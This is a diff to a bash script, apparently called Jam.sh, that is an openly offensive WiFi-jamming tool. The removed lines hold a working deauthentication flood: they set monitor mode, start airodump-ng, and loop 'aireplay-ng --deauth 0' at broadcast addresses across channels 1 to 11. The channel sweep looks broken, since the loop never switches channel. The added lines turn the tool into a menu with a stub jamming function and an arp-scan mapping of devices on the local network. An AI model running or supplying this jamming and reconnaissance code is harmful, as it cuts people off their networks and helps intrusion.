@@ -4,47 +4,68 @@
 # YT Channel : https://www.youtube.com/channel/UCKfToKJFq-uvI8svPX0WzYQ
 # -------------------------------------------------------------------------- #
 
-# Check if the script is run with sudo
-if [ "$(id -u)" -ne 0 ]; then
+#!/bin/bash
+
+# Function to display the menu
+show_menu() {
   echo "------------------------------------------------------------" | lolcat
-  echo "[+] \e[31mCANT START WITHOUT SUDO PERMISSION\e[0m [+]" | lolcat
-  echo "[+] Please start this script with                       [+]" | lolcat
-  echo "[+]         --> \e[31msudo ./Jam.sh\e[0m                           [+]" | lolcat
+  echo "[+] \e[32mJAMMING SCRIPT MENU\e[0m [+]" | lolcat
   echo "------------------------------------------------------------" | lolcat
-  exit 1
-fi
+  echo "[1] List connected WiFi adapters" | lolcat
+  echo "[2] Jam WiFi networks" | lolcat
+  echo "[3] Map connected devices" | lolcat
+  echo "[4] Exit" | lolcat
+  echo "------------------------------------------------------------" | lolcat
+}
 
-# List connected WiFi adapters
-echo "List of connected WiFi Adapters :" | lolcat
-index=1
-for adapter in $(iwconfig 2>/dev/null | grep 'IEEE\|ESSID' | cut -d ' ' -f 1); do
-  echo "[+] $index. $adapter --> ($(iwconfig $adapter | grep ESSID | cut -d ':' -f 2 | tr -d '"'))" | lolcat
-  ((index++))
-done
+# Function to list connected WiFi adapters
+list_adapters() {
+  echo "List of connected WiFi Adapters :" | lolcat
+  index=1
+  for adapter in $(iwconfig 2>/dev/null | grep 'IEEE\|ESSID' | cut -d ' ' -f 1); do
+    echo "[+] $index. $adapter --> ($(iwconfig $adapter | grep ESSID | cut -d ':' -f 2 | tr -d '"'))" | lolcat
+    ((index++))
+  done
+}
 
-# Prompt to pick a WiFi adapter
-read -p "Pick number of wifi adapter: " adapter_number
+# Function to jam WiFi networks
+jam_networks() {
+  # Add your jamming logic here
+  echo "Jamming WiFi networks..."
+}
 
-# Get the selected WiFi adapter
-selected_adapter=$(iwconfig | grep 'IEEE\|ESSID' | cut -d ' ' -f 1 | sed -n "${adapter_number}p")
+# Function to map connected devices
+map_devices() {
+  echo "Connected devices:" | lolcat
+  echo "----------------------------------------------------------" | lolcat
+  connected_devices=$(sudo arp-scan --interface=wlan0 --localnet | grep -v "$(ip -4 addr show wlan0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')")
+  sorted_devices=$(echo "$connected_devices" | sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4)
+  while IFS=$'\t' read -r ip mac name brand other_info; do
+    echo -e "$ip\t$mac\t$name\t$brand\t$other_info" | lolcat
+  done <<< "$sorted_devices"
+}
 
-# Set monitor mode on the selected WiFi adapter
-echo "Setting monitor mode on $selected_adapter..." | lolcat
-iwconfig $selected_adapter mode monitor
+# Main script
+while true; do
+  show_menu
+  read -p "Select an option (1-4): " choice
 
-# Wait for 3 seconds for monitor mode to be set
-sleep 3
-
-# Start airodump-ng on the selected WiFi adapter
-echo "Starting airodump-ng on $selected_adapter..." | lolcat
-xterm -e "airodump-ng $selected_adapter" & disown
-
-# Wait for 10 seconds before initiating WiFi disruption
-sleep 10
-
-# Disrupt WiFi networks on channels 1 to 11
-for channel in {1..11}; do
-  echo "Disrupting WiFi networks on channel $channel..." | lolcat
-  aireplay-ng --deauth 0 -a FF:FF:FF:FF:FF:FF -c FF:FF:FF:FF:FF:FF -e JammingNetwork $selected_adapter
-  sleep 2  # Adjust the delay between disruptions as needed
+  case $choice in
+    1)
+      list_adapters
+      ;;
+    2)
+      jam_networks
+      ;;
+    3)
+      map_devices
+      ;;
+    4)
+      echo "Exiting..." | lolcat
+      exit 0
+      ;;
+    *)
+      echo "Invalid choice. Please enter a number between 1 and 4." | lolcat
+      ;;
+  esac
 done
